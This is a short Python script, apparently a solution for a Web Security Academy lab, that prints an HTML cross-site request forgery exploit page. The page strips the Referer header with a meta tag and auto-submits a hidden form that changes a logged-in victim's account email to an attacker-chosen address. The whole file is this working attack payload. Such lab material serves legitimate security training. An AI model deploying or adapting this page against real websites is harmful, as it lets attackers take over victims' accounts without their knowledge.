LAB_ID = "???"

print("Exploit:")
print(f"""
<html>
<meta name="referrer" content="never">
<body>
<form action="https://{LAB_ID}.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="wiener@evil-user.net" />
</form>
<script>
    document.forms[0].submit();
</script>
</body>
</html>
""")
